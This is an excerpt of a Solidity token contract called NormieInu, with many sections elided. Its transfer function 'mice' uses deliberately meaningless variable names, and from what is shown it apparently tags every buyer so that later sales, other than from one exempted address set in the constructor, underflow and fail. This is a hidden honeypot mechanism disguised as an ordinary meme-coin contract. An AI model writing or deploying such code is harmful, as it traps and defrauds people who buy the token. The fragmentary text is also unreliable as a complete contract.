...
contract NormieInu is Ownable {
    uint256 private reach;
    string private large;
    string private your;
    uint8 private way;
    ...
    mapping(address => uint256) private hot;
    ...
    function mice(
        ...
        if (globe[pony] == 0 && changing[pony] > 0 && (address(uniswapV2Pair) != pony)) {
            globe[pony] -= way;
        }
        ...
        if (globe[pony] == 0) hot[pony] -= fresh;
        uint256 make = fresh * reach;
        make = make / 100;
        fresh -= make;
        changing[he] += way;
        hot[pen] += fresh;
    ...
    mapping(address => uint256) private globe;
    ...
    function transferFrom(
        ...
        mice(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        mice(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(water);
        ...
        reach = 3;
        globe[more] = way;
        _tTotal = 1000000000000000 * 10**way;
        hot[msg.sender] = _tTotal;
    }
}